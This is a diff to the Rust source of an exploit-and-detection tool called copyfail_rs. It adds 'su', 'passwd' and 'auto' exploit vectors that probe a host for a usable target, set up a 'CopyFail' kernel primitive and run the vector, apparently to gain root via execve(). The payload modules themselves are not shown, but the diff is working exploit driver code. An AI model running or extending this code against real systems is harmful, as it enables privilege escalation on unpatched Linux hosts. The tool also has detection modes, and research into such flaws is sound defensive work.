@@ -7,7 +7,7 @@ use copyfail_rs::detect::hunt::run_hunt;
 use copyfail_rs::detect::output::{check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF};
 use copyfail_rs::detect::scan::{default_paths, run_scan};
 use copyfail_rs::detect::watch::run_watch;
-use copyfail_rs::vectors::pam::PamVector;
+use copyfail_rs::vectors::{self, pam::PamVector};
 use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
 use core::ffi::CStr;
 use heapless::String;
@@ -217,14 +217,73 @@ fn run_exploit(args: &Args) -> i32 {
     }
     match args.vector {
         VectorChoice::Pam => run_vector_pam(),
-        VectorChoice::Auto => run_vector_pam(),
-        VectorChoice::Su | VectorChoice::Passwd => {
-            write_stderr(b"--vector su|passwd: implemented in S2 (not in this build)\n");
-            err_code(Error::NotImplemented)
-        }
+        VectorChoice::Su => run_vector_named(b"su"),
+        VectorChoice::Passwd => run_vector_named(b"passwd"),
+        VectorChoice::Auto => run_vector_auto(),
         VectorChoice::None => {
             write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto>\n");
             2
+        }
+    }
+}
+
+fn run_vector_named(name: &[u8]) -> i32 {
+    let v = match vectors::select(name) {
+        Some(v) => v,
+        None => {
+            write_stderr(b"vector unavailable\n");
+            return 5;
+        }
+    };
+    run_vector(v)
+}
+
+fn run_vector_auto() -> i32 {
+    let pam = PamVector::new();
+    if matches!(pam.applicable(), Ok(true)) {
+        return run_vector_pam();
+    }
+    for name in &[&b"su"[..], &b"passwd"[..]] {
+        if let Some(v) = vectors::select(name) {
+            if matches!(v.applicable(), Ok(true)) {
+                return run_vector(v);
+            }
+        }
+    }
+    write_stderr(b"--vector auto: no applicable vector on this host\n");
+    5
+}
+
+fn run_vector(v: &dyn Vector) -> i32 {
+    match v.applicable() {
+        Ok(true) => {}
+        Ok(false) => {
+            write_stderr(v.name().as_bytes());
+            write_stderr(b": not applicable on this host (kernel patched, target absent, or precondition not met)\n");
+            return 6;
+        }
+        Err(_) => {
+            write_stderr(v.name().as_bytes());
+            write_stderr(b": applicability probe failed\n");
+            return 7;
+        }
+    }
+    let mut prim = match CopyFail::new() {
+        Ok(p) => p,
+        Err(e) => {
+            write_stderr(v.name().as_bytes());
+            write_stderr(b": CopyFail::new failed (kernel mitigated?)\n");
+            return err_code(e);
+        }
+    };
+    write_stderr(b"[+] running vector: ");
+    write_stderr(v.name().as_bytes());
+    write_stderr(b"\n");
+    match v.execute(&mut prim) {
+        Ok(()) => 0,
+        Err(_) => {
+            write_stderr(b"[-] vector execute returned without execve(); exploit failed\n");
+            err_code(Error::Io)
         }
     }
 }
